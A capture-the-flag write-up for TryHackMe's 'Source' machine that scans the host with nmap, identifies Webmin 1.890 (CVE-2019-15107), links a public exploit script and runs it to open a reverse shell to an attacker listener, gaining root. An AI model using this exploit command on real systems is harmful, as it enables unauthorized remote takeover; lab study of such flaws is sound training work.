# Source

## 1. Introduction

### 1.1 Background

The **Source** machine from TryHackMe is a beginner-level machine where the objective is to enumerate and exploit a known vulnerability in **Webmin**, a web-based system administration tool, to first gain access and then escalate privileges to _root_. The machine uses a vulnerable version of Webmin (related to the _Webmin_ CVE-2019-15107 exploit) and teaches basic concepts of scanning, exploitation, and control of compromised systems.

### 1.1 Objectives

Essential objectives of the _Source_ machine (TryHackMe):

1. Develop enumeration skills  
2. Exploit a known web vulnerability (Webmin)  

## 2. Enumeration

### 2.1 Initial Reconnaissance

We begin by verifying connectivity:

```bash
❯ ping -c 1 source.thm
```

The host responded correctly, confirming that it was active on the network.

### 2.2 Nmap

A full port scan was performed to identify exposed services:

```bash
❯ sudo nmap -p- -Pn -sS -n --min-rate 5000 10.49.138.121 -oN allports --open
```

Detected open ports:

- **22/tcp** – SSH  
- **10000/tcp** – HTTP (Webmin)  

Afterwards, a more specific scan was executed to detect versions and run NSE scripts:

```bash
❯ nmap -p22,10000 -Pn -sCV source.thm -oN targeted
```

Relevant results:

- **22: OpenSSH 7.6p1**  
- **10000: MiniServ 1.890 (Webmin httpd)**  

Webmin version 1.890 is known to be vulnerable to remote command execution.

### 2.3 Vulnerability Research

After identifying the service version, a search for public exploits was performed. A functional exploit was found on GitHub that leverages the **CVE-2019-15107** vulnerability, allowing remote command execution without authentication.

```
https://github.com/ruthvikvegunta/CVE-2019-15107/blob/master/webmin_rce.py
```

## 3. Exploitation

The Python exploit was used to obtain a reverse shell to our attacker machine:

```bash
❯ python3 webmin_rce.py -t https://source.thm:10000 -l LHOST -p 9001
```

Where:

- `-t` specifies the vulnerable target  
- `-l` indicates the local IP to receive the connection  
- `-p` defines the listening port  

After executing the exploit, initial access to the compromised system was obtained with root privileges.
